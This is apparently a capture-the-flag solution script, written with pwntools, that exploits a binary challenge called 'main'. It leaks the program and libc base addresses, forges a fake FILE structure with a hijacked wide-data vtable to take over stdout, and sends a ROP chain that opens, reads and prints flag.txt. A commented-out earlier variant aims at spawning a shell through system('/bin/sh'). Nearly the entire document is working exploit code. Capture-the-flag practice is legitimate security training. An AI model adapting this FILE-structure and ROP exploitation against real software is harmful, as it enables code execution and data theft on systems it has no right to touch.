# by n0psledbyte 
from pwn import *
from struct import unpack

context.terminal = "tmux splitw -h".split()
context.arch = "amd64"
DEBUG = 0
target = "blackhat4-d70007bc1236b2dbc7df6b8689124d38-0.chals.bh.ctf.sa"
# p = remote(target, 443, ssl=True, sni=target)
# p = process("./main2", env={"LD_PRELOAD":"./libc.so.6"})
p = process("./main")
ru = p.recvuntil
sla = p.sendlineafter

# A handy function to craft FILE structures
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, b"\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, b"\x00")
    return struct

libc = ELF("./libc.so.6", checksec=False)
if DEBUG:
    gdb.attach(p, "")

p.recvuntil(":")
p.send("a"*8)
p.recvuntil("Agent name ")
p.recv(8)
leak = u64(p.recvuntil(" \n", drop=True).ljust(8, b"\x00"))

text_base = leak-5122
print(hex(text_base))


p.recvuntil(":")
p.send("a"*8*5)
p.recvuntil("Agent name ")
p.recv(8*5)
leak = u64(p.recvuntil(" \n", drop=True).ljust(8, b"\x00"))
print(hex(leak))

libc_base = leak-578483
print(hex(libc_base))
libc.address = libc_base

stdout_addr = libc.symbols['_IO_2_1_stdout_']
stdout = stdout_addr
stdout_lock = text_base + 0x202060 + 0x80
# Our target
"""
rip = libc_base + libc.symbols['system']
rip = 0x414141414142
rdi = next(libc.search(b"/bin/sh")) # The first param we want

# We can only have even rdi
assert(rdi%2 == 0)

# Crafting FILE structure

# This stores the address of a pointer to the _IO_str_overflow function
# Libc specific
io_str_overflow_ptr_addr = libc.symbols['_IO_file_jumps'] + 0xd8
print("str overflow @ 0x{:08x}".format(io_str_overflow_ptr_addr))
# Calculate the vtable by subtracting appropriate offset
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8

# Craft file struct
file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)//2,
                        _IO_write_ptr = (rdi-100)//2,
                        _IO_write_base = 0,
                        _lock = text_base + 0x202060 + 0x80)

# vtable pointer
file_struct += p64(fake_vtable_addr)
# Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(rip)
"""

fake_vtable = libc.symbols['_IO_wfile_jumps']-3*8
# our gadget
gadget = libc.address + 0x0000000000163830 # add rdi, 0x10 ; jmp rcx
gadget = libc.address + 0x000000000014238b # add rsp, 0x168 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.symbols['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'flag.txt')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= text_base+0x202060 + 0x48-0x18
fake._wide_data = text_base+0x202060+0xe8
print(fake)
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

pay = bytes(fake)
print("LEN : {:04x}".format(len(pay)))
pay = pay.ljust(64*4, b"\x00")
dataf = []

for i in range(0, len(pay), 4):
    dataf.append(unpack("<f", pay[i:i+4])[0])

sla(":", b"A"*100)
sla("missions: ", str(64).encode())
for i in range(64):
    sla("code: ", str(dataf[i]).encode())
pause()
sla("code: ", str(unpack("<f", p32((text_base+0x202060)&0xffffffff))[0]).encode())
pop_rdx_rsi = libc.address + 0x0000000000130539 # : pop rdx ; pop rsi ; ret
pop_rdi = libc.address + 0x000000000002164f
pay = b"A"*0x20
pay += p64(pop_rdx_rsi)
pay += p64(0)*2
pay += p64(libc.symbols['open'])

pay += p64(pop_rdi)
pay += p64(4)
pay += p64(pop_rdx_rsi)
pay += p64(0x100)
pay += p64(text_base+0x202060)
pay += p64(libc.symbols['read'])

pay += p64(pop_rdi)
pay += p64(1)
pay += p64(pop_rdx_rsi)
pay += p64(0x100)
pay += p64(text_base+0x202060)
pay += p64(libc.symbols['write'])

pay += b"B"*0x20
sla(":", pay)

"""
0x000000000002164f : pop rdi ; ret
0x0000000000130539 : pop rdx ; pop rsi ; ret
"""
p.interactive()